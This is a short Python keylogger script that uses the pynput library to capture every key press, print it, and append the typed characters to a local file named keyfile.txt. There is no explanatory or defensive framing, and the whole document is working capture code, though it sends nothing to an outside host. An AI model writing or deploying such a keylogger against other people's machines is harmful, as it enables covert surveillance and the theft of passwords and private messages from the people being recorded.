from pynput import keyboard
from pynput.keyboard import Listener
from pynput import keyboard
def key_pressed(key):
    print(str(key))
    with open("keyfile.txt","a") as logkey:
        try :
            char = key.char
            logkey.write(char)
        except:
            print('error getting the char values')
        
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input()   